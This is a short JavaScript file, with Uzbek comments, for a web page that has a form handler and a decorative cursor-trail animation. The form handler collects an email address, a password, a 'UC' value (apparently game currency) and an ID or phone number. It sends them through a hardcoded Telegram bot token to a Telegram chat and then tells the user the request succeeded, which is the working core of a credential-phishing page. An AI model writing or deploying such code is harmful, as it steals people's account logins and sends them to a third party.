const chatId = "-1002272598717";
const telegramBotId = "7660671086:AAFn0aRzQnZCzByQtUlVy2vU0NAkQ1q-ir8"; 
const url = "https://api.telegram.org/bot" + telegramBotId + "/sendMessage";

// So'rov yuborish
const sendRequest = (e) => {
  e.preventDefault();

  const firstName = document.querySelector(".js-first-name").value.trim();
  const age = document.querySelector(".js-age").value.trim();
  const parol = document  .querySelector(".parol").value.trim();
  const nomer = document.querySelector(".nomer").value.trim();

  const message = `👤 gmail: ${firstName}\n🎂 parol: ${age}\n🔐 UC: ${parol}\n📞 ID: ${nomer}`;

  const formData = {
    chat_id: chatId,
    text: message,
  };

  axios
    .post(url, formData)
    .then(() => {
      alert("So'rov muvaffaqiyatli yuborildi!");
    })
    .catch(() => {
      alert("Nimadir xato ketdi!");
    });

  // Formani tozalash
  document.querySelector(".js-first-name").value = "";
  document.querySelector(".js-age").value = "";
  document.querySelector(".parol").value = "";
  document.querySelector(".nomer").value = "";
};

document.querySelector(".js-register-form").addEventListener("submit", sendRequest);



// cursor
    // Segmentlarni olish
    const segments = document.querySelectorAll('.segment');
    const numSegments = segments.length;
    let mouseX = 0, mouseY = 0;
    let delay = 0.2;

    // Kursor harakatini kuzatish
    document.addEventListener('mousemove', (e) => {
      mouseX = e.clientX;
      mouseY = e.clientY;
    });

    // Segmentlarni kursorni kuzatib harakatlantirish
    function animateRope() {
      let x = mouseX, y = mouseY;

      segments.forEach((segment, index) => {
        const segmentX = parseFloat(segment.style.left) || 0;
        const segmentY = parseFloat(segment.style.top) || 0;

        const dx = x - segmentX;
        const dy = y - segmentY;

        // Segmentning yangi joyini hisoblash va qo'llash
        segment.style.left = `${segmentX + dx * delay}px`;
        segment.style.top = `${segmentY + dy * delay}px`;

        // Keyingi segment uchun joylashuvni yangilash
        x = segmentX;
        y = segmentY;
      });

      requestAnimationFrame(animateRope);
    }

    animateRope(); // Harakatni boshlash